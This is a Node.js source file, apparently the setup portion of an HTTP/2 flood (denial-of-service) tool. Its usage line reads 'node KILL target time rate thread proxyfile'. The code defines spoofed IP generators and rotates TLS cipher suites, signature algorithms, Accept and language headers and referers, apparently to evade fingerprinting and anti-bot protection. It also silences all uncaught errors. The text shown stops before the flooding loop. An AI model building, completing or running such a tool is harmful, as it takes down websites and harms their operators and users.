const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require('url');
const crypto = require("crypto");
const fs = require('fs');
process.setMaxListeners(0x0);
require("events").EventEmitter.defaultMaxListeners = 0x0;
process.on("uncaughtException", function (_0x14f6cf) {});
if (process.argv.length < 0x7) {
  console.log("Usage: node KILL target time rate thread proxyfile");
  process.exit();
}
const headers = {};
function readLines(_0x13ae92) {
  return fs.readFileSync(_0x13ae92, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x4831be, _0x4a70b3) {
  return Math.floor(Math.random() * (_0x4a70b3 - _0x4831be) + _0x4831be);
}
function randomElement(_0x5e65fa) {
  return _0x5e65fa[Math.floor(Math.random() * (_0x5e65fa.length - 0x0) + 0x0)];
}
function randstr(_0x4c63d6) {
  let _0x5f0cb4 = '';
  const _0x460ce3 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length;
  for (let _0x586d29 = 0x0; _0x586d29 < _0x4c63d6; _0x586d29++) {
    _0x5f0cb4 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * _0x460ce3));
  }
  return _0x5f0cb4;
}
const ip_spoof = () => {
  return Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff);
};
const spoofed = Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff);
const ip_spoof2 = () => {
  return '' + Math.floor(Math.random() * 0x270f);
};
const ip_spoof1 = () => {
  return '' + Math.floor(Math.random() * 0xc350);
};
const args = {
  'target': process.argv[0x2],
  'time': parseInt(process.argv[0x3]),
  'Rate': parseInt(process.argv[0x4]),
  'threads': parseInt(process.argv[0x5]),
  'proxyFile': process.argv[0x6]
};
const sig = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", "ecdsa_secp521r1_sha512", "rsa_pss_rsae_sha256", "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", 'rsa_pkcs1_sha256', "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"];
const cplist = ["ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", 'ECDHE-RSA-AES128-GCM-SHA256', "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES256-GCM-SHA384", 'ECDHE-ECDSA-AES128-GCM-SHA256', "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5', "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK', "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5', "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK', "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5', 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS', 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK', "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK', "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"];
const accept_header = ["*/*", "image/*", "image/webp,image/apng", 'text/html', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5", 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9", "text/html; charset=utf-8", "application/json, text/plain, */*", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', "*/*", 'image/*', "image/webp,image/apng", "text/html", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language: en-US,en;q=0.5", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0", "Connection: keep-alive", "Referer: https://www.example.com", "Upgrade-Insecure-Requests: 1", "DNT: 1", "Accept-Encoding: gzip, deflate, br", "Cache-Control: max-age=0", "Host: www.example.com", "Origin: https://www.example.com", "Content-Type: application/x-www-form-urlencoded", "Content-Length: 42", "Cookie: session_id=abc123; user_id=12345", "If-None-Match: \"686897696a7c876b7e\"", "X-Requested-With: XMLHttpRequest", "X-Forwarded-For: 192.168.1.1", "CF-Challenge: captcha-challenge-header", 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"];
lang_header = ["ko-KR", "en-US", "zh-CN", 'zh-TW', 'ja-JP', "en-GB", "en-AU", 'en-GB,en-US;q=0.9,en;q=0.8', 'en-GB,en;q=0.5', "en-CA", "en-UK, en, de;q=0.5", "en-NZ", 'en-GB,en;q=0.6', "en-ZA", 'en-IN', "en-PH", "en-SG", 'en-HK', "en-GB,en;q=0.8", 'en-GB,en;q=0.9', " en-GB,en;q=0.7", "ko-KR", "en-US", "zh-CN", "zh-TW", "ja-JP", "en-GB", 'en-AU', "en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.5", "en-CA", "en-UK, en, de;q=0.5", "en-NZ", "en-GB,en;q=0.6", 'en-ZA', "en-IN", 'en-PH', "en-SG", "en-HK", "en-GB,en;q=0.8", "en-GB,en;q=0.9", " en-GB,en;q=0.7", "en-US,en;q=0.9", "en-GB,en;q=0.9", 'en-CA,en;q=0.9', "en-AU,en;q=0.9", "en-NZ,en;q=0.9", 'en-ZA,en;q=0.9', "en-IE,en;q=0.9", "en-IN,en;q=0.9", 'ar-SA,ar;q=0.9', "az-Latn-AZ,az;q=0.9", "be-BY,be;q=0.9", 'bg-BG,bg;q=0.9', 'bn-IN,bn;q=0.9', "ca-ES,ca;q=0.9", "cs-CZ,cs;q=0.9", "cy-GB,cy;q=0.9", 'da-DK,da;q=0.9', "de-DE,de;q=0.9", "el-GR,el;q=0.9", "es-ES,es;q=0.9", 'et-EE,et;q=0.9', "eu-ES,eu;q=0.9", 'fa-IR,fa;q=0.9', "fi-FI,fi;q=0.9", "fr-FR,fr;q=0.9", "ga-IE,ga;q=0.9", "gl-ES,gl;q=0.9", "gu-IN,gu;q=0.9", "he-IL,he;q=0.9", "hi-IN,hi;q=0.9", "hr-HR,hr;q=0.9", "hu-HU,hu;q=0.9", "hy-AM,hy;q=0.9", "id-ID,id;q=0.9", "is-IS,is;q=0.9", 'it-IT,it;q=0.9', "ja-JP,ja;q=0.9", "ka-GE,ka;q=0.9", "kk-KZ,kk;q=0.9", 'km-KH,km;q=0.9', 'kn-IN,kn;q=0.9', "ko-KR,ko;q=0.9", "ky-KG,ky;q=0.9", 'lo-LA,lo;q=0.9', 'lt-LT,lt;q=0.9', "lv-LV,lv;q=0.9", "mk-MK,mk;q=0.9", 'ml-IN,ml;q=0.9', "mn-MN,mn;q=0.9", "mr-IN,mr;q=0.9", "ms-MY,ms;q=0.9", "mt-MT,mt;q=0.9", "my-MM,my;q=0.9", "nb-NO,nb;q=0.9", 'ne-NP,ne;q=0.9', "nl-NL,nl;q=0.9", 'nn-NO,nn;q=0.9', "or-IN,or;q=0.9", "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", "pt-BR,pt;q=0.9", "pt-PT,pt;q=0.9", 'ro-RO,ro;q=0.9', "ru-RU,ru;q=0.9", "si-LK,si;q=0.9", "sk-SK,sk;q=0.9", "sl-SI,sl;q=0.9", "sq-AL,sq;q=0.9", "sr-Cyrl-RS,sr;q=0.9", 'sr-Latn-RS,sr;q=0.9', "sv-SE,sv;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9", "te-IN,te;q=0.9", 'th-TH,th;q=0.9', "tr-TR,tr;q=0.9", "uk-UA,uk;q=0.9", "ur-PK,ur;q=0.9", "uz-Latn-UZ,uz;q=0.9", "vi-VN,vi;q=0.9", 'zh-CN,zh;q=0.9', "zh-HK,zh;q=0.9", "zh-TW,zh;q=0.9", "am-ET,am;q=0.8", "as-IN,as;q=0.8", "az-Cyrl-AZ,az;q=0.8", "bn-BD,bn;q=0.8", "bs-Cyrl-BA,bs;q=0.8", 'bs-Latn-BA,bs;q=0.8', "dz-BT,dz;q=0.8", "fil-PH,fil;q=0.8", "fr-CA,fr;q=0.8", "fr-CH,fr;q=0.8", "fr-BE,fr;q=0.8", 'fr-LU,fr;q=0.8', 'gsw-CH,gsw;q=0.8', "ha-Latn-NG,ha;q=0.8", "hr-BA,hr;q=0.8", "ig-NG,ig;q=0.8", "ii-CN,ii;q=0.8", "is-IS,is;q=0.8", "jv-Latn-ID,jv;q=0.8", 'ka-GE,ka;q=0.8', "kkj-CM,kkj;q=0.8", 'kl-GL,kl;q=0.8', "km-KH,km;q=0.8", 'kok-IN,kok;q=0.8', 'ks-Arab-IN,ks;q=0.8', "lb-LU,lb;q=0.8", "ln-CG,ln;q=0.8", "mn-Mong-CN,mn;q=0.8", "mr-MN,mr;q=0.8", "ms-BN,ms;q=0.8", "mt-MT,mt;q=0.8", "mua-CM,mua;q=0.8", "nds-DE,nds;q=0.8", "ne-IN,ne;q=0.8", 'nso-ZA,nso;q=0.8', "oc-FR,oc;q=0.8", "pa-Arab-PK,pa;q=0.8", 'ps-AF,ps;q=0.8', "quz-BO,quz;q=0.8", "quz-EC,quz;q=0.8", 'quz-PE,quz;q=0.8', "rm-CH,rm;q=0.8", 'rw-RW,rw;q=0.8', "sd-Arab-PK,sd;q=0.8", 'se-NO,se;q=0.8', "si-LK,si;q=0.8", "smn-FI,smn;q=0.8", 'sms-FI,sms;q=0.8', "syr-SY,syr;q=0.8", "tg-Cyrl-TJ,tg;q=0.8", 'ti-ER,ti;q=0.8', 'tk-TM,tk;q=0.8', "tn-ZA,tn;q=0.8", 'tt-RU,tt;q=0.8', "ug-CN,ug;q=0.8", "uz-Cyrl-UZ,uz;q=0.8", "ve-ZA,ve;q=0.8", "wo-SN,wo;q=0.8", "xh-ZA,xh;q=0.8", "yo-NG,yo;q=0.8", "zgh-MA,zgh;q=0.8", "zu-ZA,zu;q=0.8"];
const encoding_header = ["gzip, deflate, br", "deflate", "gzip, deflate, lzma, sdch", "deflate"];
const control_header = ["no-cache", "max-age=0", "no-store", 'no-transform', "only-if-cached", "must-revalidate", "public", "private", 'proxy-revalidate', "s-maxage=86400"];
const refers = ["https://www.google.com/", 'https://www.facebook.com/', "https://www.twitter.com/", "https://www.youtube.com/", "https://www.linkedin.com/", 'https://proxyscrape.com/', "https://www.instagram.com/", "https://wwww.reddit.com/", "https://fivem.net/", "https://www.fbi.gov/", "https://nettruyenplus.com/", "https://vnexpress.net/", "https://zalo.me", "https://shopee.vn", "https://www.tiktok.com/", "https://google.com.vn/", "https://tuoitre.vn/", "https://thanhnien.vn/", 'https://nettruyento.com/'];
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
